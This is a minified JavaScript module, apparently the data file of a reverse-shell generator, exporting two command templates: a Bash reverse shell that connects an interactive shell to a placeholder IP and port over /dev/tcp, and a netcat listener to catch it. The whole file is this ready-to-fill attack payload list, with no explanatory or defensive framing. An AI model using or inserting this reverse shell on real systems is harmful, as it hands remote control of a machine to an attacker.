const e=[{title:"Basic Bash Reverse Shell",template:"bash -i >& /dev/tcp/{ip}/{port} 0>&1"},{title:"Netcat Listener",template:"nc -lvnp {port}"}],t={commands:e};export{e as commands,t as default};
